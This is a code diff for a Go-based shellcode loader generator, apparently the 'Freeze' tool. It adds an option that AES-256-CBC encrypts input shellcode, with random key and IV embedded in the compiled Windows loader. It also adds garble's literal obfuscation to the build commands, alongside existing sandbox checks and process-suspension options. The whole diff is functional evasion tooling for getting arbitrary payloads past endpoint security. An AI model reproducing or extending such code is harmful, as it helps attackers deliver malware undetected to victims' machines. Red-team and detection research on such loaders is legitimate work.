@@ -4,6 +4,9 @@ import (
 	"Freeze/Loader"
 	"Freeze/Utils"
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
 	"encoding/hex"
 	"flag"
 	"fmt"
@@ -22,6 +25,7 @@ type FlagOptions struct {
 	Sha       bool
 	process   string
 	export    string
+	encrypt   bool
 }
 
 func options() *FlagOptions {
@@ -34,9 +38,10 @@ func options() *FlagOptions {
 	Is Endpoint joined to a domain?
 	Does the Endpoint have more than 2 CPUs?
 	Does the Endpoint have more than 4 gigs of RAM?`)
+	encrypt := flag.Bool("encrypt", false, "Encrypts the shellcode using AES 256 encryption")
 	export := flag.String("export", "", "For DLL Loaders Only - Specify a specific Export function for a loader to have.")
 	flag.Parse()
-	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, console: *console, Sha: *Sha, sandbox: *sandbox, process: *process, export: *export}
+	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, console: *console, Sha: *Sha, sandbox: *sandbox, process: *process, export: *export, encrypt: *encrypt}
 }
 
 func execute(opt *FlagOptions, name string, mode string) {
@@ -44,9 +49,9 @@ func execute(opt *FlagOptions, name string, mode string) {
 	var compiledname string
 	var cmd *exec.Cmd
 	if mode == "dll" {
-		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "../.lib/garble", "-seed=random", "build", "-o", ""+name+"", "-buildmode=c-shared")
+		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "../.lib/garble", "-seed=random", "-literals", "build", "-o", ""+name+"", "-buildmode=c-shared")
 	} else {
-		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "../.lib/garble", "-seed=random", "build", "-o", ""+name)
+		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "../.lib/garble", "-literals", "-seed=random", "build", "-o", ""+name)
 	}
 	fmt.Println("[*] Compiling Payload")
 	var out bytes.Buffer
@@ -94,7 +99,34 @@ func main() {
 	}
 	Utils.CheckGarble()
 	var mode string
+	var rawbyte []byte
+	var b64ciphertext, b64key, b64iv string
 	src, _ := ioutil.ReadFile(opt.inputFile)
+	if opt.encrypt == true {
+		dst := make([]byte, hex.EncodedLen(len(src)))
+		hex.Encode(dst, src)
+		r := base64.StdEncoding.EncodeToString(dst)
+		rawbyte = []byte(r)
+		key := Utils.RandomBuffer(32)
+		iv := Utils.RandomBuffer(16)
+
+		block, err := aes.NewCipher(key)
+		if err != nil {
+			log.Fatal(err)
+		}
+		paddedInput, err := Utils.Pkcs7Pad([]byte(rawbyte), aes.BlockSize)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println("[*] Encrypting Shellcode Using AES Encryption")
+		cipherText := make([]byte, len(paddedInput))
+		ciphermode := cipher.NewCBCEncrypter(block, iv)
+		ciphermode.CryptBlocks(cipherText, paddedInput)
+		b64ciphertext = base64.StdEncoding.EncodeToString(cipherText)
+		b64key = base64.StdEncoding.EncodeToString(key)
+		b64iv = base64.StdEncoding.EncodeToString(iv)
+		fmt.Println("[+] Shellcode Encrypted")
+	}
 	shellcodeencoded := hex.EncodeToString(src)
 
 	if strings.HasSuffix(opt.outFile, "dll") == true {
@@ -106,7 +138,7 @@ func main() {
 		fmt.Println("[!] Added an additional Export function called: " + opt.export)
 	}
 	fmt.Println("[!] Selected Process to Suspend: " + opt.process)
-	name := Loader.CompileFile(shellcodeencoded, opt.outFile, opt.console, mode, opt.export, opt.sandbox, opt.process)
+	name := Loader.CompileFile(shellcodeencoded, b64ciphertext, b64key, b64iv, opt.outFile, opt.console, mode, opt.export, opt.sandbox, opt.process, opt.encrypt)
 	execute(opt, name, mode)
 
 }
